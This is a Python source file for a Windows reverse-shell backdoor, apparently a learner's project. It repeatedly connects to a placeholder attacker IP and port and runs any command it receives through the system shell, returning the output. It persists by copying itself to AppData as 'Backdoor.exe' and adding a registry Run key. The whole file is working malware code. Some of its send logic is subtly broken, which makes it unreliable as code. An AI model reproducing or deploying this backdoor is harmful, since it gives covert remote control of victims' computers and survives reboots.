#!/usr/bin/python
import socket
import json
import subprocess
import time
import sys
import os
import shutil

#It allows us to recieve large bytes of data without the program breaking 
def relaible_recv():
	global json_data 
	json_data=""
	while True:
		try:
			json_data=json_data + str(sock.recv(1024))
			return json.loads(json_data)
		except ValueError:
			continue

#it allows us to send large bytes of data
def relaible_send(data):
	json.dumps(data)
	sock.send(json_data)

#It allows us to recive the commands from the server and process them to execute in the terminal
def shell():
	while True:
		command=relaible_recv()
		if command=='q':
			break
			
		elif command[:2]=='cd' and len(command)>1:
			try:
				os.chdir(command[3:])
			except:
				continue

		else:
			try:
				proc=subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
				result=proc.stdout.read()+proc.stderr.read()
				relaible_send(result)

			except:
				relaible_send("[!!]Can't execute the command: "+command)


#It connects us to the server 
def connection():
	while True:
		time.sleep(30)
		try:
			sock.connect(("<ip addr>",54321))
			shell()
		except:
			connection()

#It copies our reverse shell once executed and makes it run as soon as the machine boots up		
location=os.environ["appdata"]+"\\Backdoor.exe"
if not os.path.exists(location):
	shutil.copyfile(sys.executable,location)
	subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v reverse_shell /t REG_SZ /d"'+location+'"', shell=True)

sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connection()
sock.close()
